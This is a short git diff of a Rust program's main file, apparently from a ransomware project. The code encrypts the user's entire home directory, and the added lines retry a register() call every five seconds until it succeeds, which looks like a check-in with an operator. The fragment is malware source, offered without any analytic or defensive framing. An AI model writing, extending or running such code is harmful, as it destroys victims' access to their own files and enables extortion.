@@ -1,6 +1,9 @@
 mod crypto;
 use crypto::encrypt_directory;
+use crypto::register;
 use std::env;
+use std::thread::sleep;
+use std::time::Duration;
 
 fn main() {
     #[cfg(target_os = "windows")]
@@ -8,6 +11,16 @@ fn main() {
     #[cfg(target_os = "linux")]
     let home: String = env::var("HOME").unwrap();
     encrypt_directory(&home).unwrap(); // I know this many unwraps look
-                                                        // suspicious, but the chance of this
-                                                        // failing is less than a solar flare.
+                                       // suspicious, but the chance of this
+                                       // failing is less than a solar flare.
+
+    loop {
+        let registration_attempt = register();
+        if registration_attempt.is_ok() {
+            break;
+        } else {
+            sleep(Duration::from_secs(5));
+        }
+    }
+    
 }
